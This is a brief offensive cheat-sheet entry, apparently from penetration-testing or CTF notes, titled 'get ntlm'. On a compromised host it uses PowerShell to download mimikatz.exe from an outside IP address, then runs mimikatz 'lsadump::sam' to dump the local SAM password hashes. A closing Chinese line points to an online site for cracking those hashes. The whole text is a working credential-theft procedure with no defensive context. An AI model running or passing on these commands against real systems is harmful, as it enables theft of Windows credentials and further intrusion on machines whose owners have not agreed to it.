

### get ntlm
```bash
RCE_SHELL$ powershell (New-Object System.Net.WebClient).DownloadFile(\"http://10.4.11.38:1234/mimikatz.exe\", \"mimikatz.exe\")
```
```bash
RCE_SHELL$ mimikatz "lsadump::sam" exit
```
> 可用[ntlm.pw](https://ntlm.pw)解碼 